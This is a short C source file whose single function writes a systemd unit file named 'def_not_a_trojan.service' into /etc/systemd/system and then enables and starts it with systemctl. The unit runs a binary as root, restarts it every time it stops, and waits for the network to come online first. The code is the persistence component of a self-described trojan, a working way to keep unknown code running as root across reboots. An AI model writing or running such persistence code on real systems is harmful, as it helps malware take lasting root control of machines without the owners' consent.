#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

void start_daemon(void) {
	char service_file[] =
		"[Unit]\n"
		"Description=Def not a trojan\n"
		"After=network-online.target\n"
		"\n"
		"[Service]\n"
		"Type=exec\n"
		"ExecStart=/usr/bin/def_not_a_trojan\n"
		"Restart=always\n"
		"RestartSec=5\n"
		"NotifyAccess=all\n"
		"User=root\n"
		"\n"
		"[Install]\n"
		"WantedBy=multi-user.target\n";

	int fd = open("/etc/systemd/system/def_not_a_trojan.service",
		O_CREAT | O_TRUNC | O_WRONLY, S_IRUSR | S_IRGRP | S_IROTH);

	write(fd, service_file, sizeof(service_file));
	close(fd);
	system("systemctl --quiet daemon-reload");
	system("systemctl --quiet enable def_not_a_trojan.service");
	system("systemctl --quiet start def_not_a_trojan.service");
}
